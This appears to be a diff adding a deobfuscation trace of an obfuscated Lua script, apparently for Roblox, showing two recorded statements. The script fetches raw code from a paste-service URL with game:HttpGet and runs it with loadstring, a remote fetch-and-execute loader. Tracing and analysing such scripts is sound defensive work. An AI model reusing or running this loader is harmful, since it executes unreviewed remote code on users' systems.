@@ -1,0 +1,10 @@
+-- Behaviour trace of a Unknown obfuscator script
+-- NOTE: reconstructed from observed behaviour; branches that were not taken
+--       during the trace are missing and conditions are only noted in comments.
+-- run status: finished
+-- 2 statements recorded in 0.03s
+-- URLs requested:
+--   https://api.rubis.app/v2/scrap/3Gdzp2phAnRo6QqZ/raw
+
+local response = game:HttpGet("https://api.rubis.app/v2/scrap/3Gdzp2phAnRo6QqZ/raw")
+loadstring(response)()
